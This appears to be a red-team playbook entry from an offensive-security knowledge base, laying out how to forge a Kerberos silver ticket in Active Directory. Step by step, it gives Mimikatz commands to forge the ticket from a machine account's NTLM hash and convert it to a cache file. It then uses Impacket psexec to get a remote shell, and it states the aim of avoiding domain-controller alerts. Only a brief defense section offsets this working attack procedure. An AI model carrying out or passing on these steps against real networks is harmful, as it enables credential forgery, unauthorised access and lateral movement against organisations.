---
type: procedure
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Pass the Ticket|T1097 - Pass the Ticket]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Kerberos Tickets]]'
  - '[[tags/Pass-the-Ticket Silver Tickets]]'
commands:
  - '[[commands/mimikatz-create-silver-ticket]]'
  - '[[commands/mimikatz-convert-ticket-to-ccache]]'
  - '[[commands/export-krb5ccname]]'
  - '[[commands/impacket-psexec-with-kerberos]]'
tools:
  - '[[tools/Mimikatz]]'
  - '[[tools/Impacket]]'
platforms:
  - Windows
  - Linux
  - IaaS
skill_level: intermediate
impact_level: high
detection_risk: high
verified: true
validated: true
---

# Create-Kerberos-Silver-Ticket

## Summary

This procedure demonstrates how to forge a Kerberos silver ticket using Mimikatz to impersonate a user for a specific service on a target host in an Active Directory environment. Silver tickets allow attackers to access services like file shares (CIFS) without valid credentials by using the NTLM hash of the target machine account, enabling lateral movement after initial compromise.

## Description

A silver ticket is a forged Kerberos service ticket created offline using the NTLM hash of a machine or service account. Unlike golden tickets, which impersonate any user domain-wide using the KRBTGT hash, silver tickets are scoped to a specific service and target, making them useful for targeted lateral movement, such as accessing SMB shares. This technique falls under Pass the Ticket (T1097) and requires prior access to the NTLM hash, often obtained via tools like Secretsdump or LSASS dumping. Once created, the ticket can be injected into the current session or exported to a cache for use on other systems, allowing authentication to the target service as the specified user without interacting with the domain controller.

## Requirements

1. Compromised access to a domain-joined Windows machine or Linux attacker system with domain visibility.
2. NTLM hash of the target machine account (e.g., via [[procedures/Dump-Machine-Account-Hashes]] or similar).
3. Domain SID, target hostname, and service details (e.g., CIFS for SMB).
4. Mimikatz installed on Windows or accessible; Impacket for Linux-based execution.
5. Network access to the target host and domain controller.

## Defense

- Implement least privilege by restricting machine account usage and monitoring hash exposure.
- Enforce strong password policies, Kerberos armoring (PAC validation), and multi-factor authentication to limit credential reuse.
- Monitor for anomalous Kerberos activity, such as unusual service ticket requests or logons from unexpected hosts, using tools like Windows Event Logs (Event ID 4769) or SIEM rules.
- Use protected processes (e.g., Credential Guard) to prevent LSASS dumping and ticket extraction.

## Objectives

1. Forge a valid Kerberos service ticket for a specific target service using the machine NTLM hash.
2. Export and apply the ticket for authentication to restricted resources.
3. Achieve lateral movement by accessing the target service (e.g., SMB shares) as an elevated user.
4. Maintain access without alerting domain controllers to invalid authentications.

## Instructions

### Step 1: Create the Silver Ticket

**Context**: Use Mimikatz to generate the silver ticket file (.kirbi) based on the target machine's NTLM hash. This forges a ticket for the specified service (e.g., CIFS) and user, scoped to the target host. Do not use /ptt here to save the ticket for export; /ptt would inject it locally instead.

**Command** ([[commands/mimikatz-create-silver-ticket]]):

In the Mimikatz prompt:

```
kerberos::golden /user:$_USER /domain:$_DOMAIN /sid:$_SID /rc4:$_NT_HASH /target:$_TARGET /service:$_SERVICE
```

> This command outputs a .kirbi file containing the forged ticket. Replace placeholders with actual values (e.g., /user:Administrator /domain:adsec.local /sid:S-1-5-21-... /rc4:aad3b435... /target:DESKTOP-01.adsec.local /service:cifs). Success is indicated by Mimikatz confirming ticket creation without errors. The ticket can now be used for service authentication.

### Step 2: Convert Ticket to Cache File

**Context**: Convert the .kirbi ticket file to a Kerberos cache format (.ccache) compatible with tools like Impacket on Linux systems. This step prepares the ticket for use in cross-platform attacks.

**Command** ([[commands/mimikatz-convert-ticket-to-ccache]]):

In the Mimikatz prompt:

```
misc::convert ccache $_INPUT_FILE.kirbi
```

> Run this after Step 1 to generate ticket.ccache. Expected output is a confirmation message like "Conversion successful." Verify the .ccache file exists in the current directory. If the input file is missing, ensure Step 1 completed without errors.

### Step 3: Set Kerberos Cache Environment Variable

**Context**: On the attacker machine (e.g., Kali Linux), set the KRB5CCNAME environment variable to point to the converted cache file. This loads the silver ticket into the session for use by Kerberos-aware tools.

**Command** ([[commands/export-krb5ccname]]):

```
export KRB5CCNAME=$_CCACHE_PATH
```

> Execute in the terminal where the .ccache file is located (e.g., export KRB5CCNAME=/tmp/ticket.ccache). No output is expected on success; verify with echo $KRB5CCNAME. This makes the ticket available for subsequent authentications without re-entering credentials.

### Step 4: Execute Remote Command with the Ticket

**Context**: Use the loaded ticket to authenticate and execute commands on the target host via SMB (for CIFS service). This demonstrates lateral movement using the silver ticket, bypassing password prompts.

**Command** ([[commands/impacket-psexec-with-kerberos]]):

```
./psexec.py -k -no-pass -dc-ip $_DC_IP $_DOMAIN/$_USER@$_TARGET
```

> Run from the Impacket directory (e.g., ./psexec.py -k -no-pass -dc-ip 192.168.1.1 adsec.local/Administrator@192.168.1.100). Expected output includes a remote shell prompt on the target (e.g., C:\Windows\system32> ). If authentication fails, check ticket validity, network reachability, and DC IP. Success grants a shell as the impersonated user.
